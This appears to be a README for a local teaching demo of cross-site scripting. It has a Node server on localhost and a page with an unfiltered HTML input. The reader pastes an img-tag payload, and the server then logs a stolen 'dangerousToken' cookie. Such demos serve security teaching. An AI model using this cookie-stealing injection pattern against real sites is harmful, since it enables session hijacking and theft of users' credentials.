# xss-example

This is a demonstration of simple XSS attack. You should have [Node.js](https://nodejs.org/en/) installed.

First, run server part:

`node server.js`

It will start HTTP server on http://localhost:8000.

Now open index.html in the browser using virtual host (with IDE, for example).
You should have `dangerousToken` cookie set to the storage.
There is a div on top of the page where you can see any HTML submitted from the textarea.
There are no limitations on the input data.

Update the div content with this:

`<img src="http://localhost:8000/" />`

You should see the string in the terminal where the server was started:

`Received token: youShouldNotGetThis`

If you see it then the cookie was successfully stolen. Congratulations!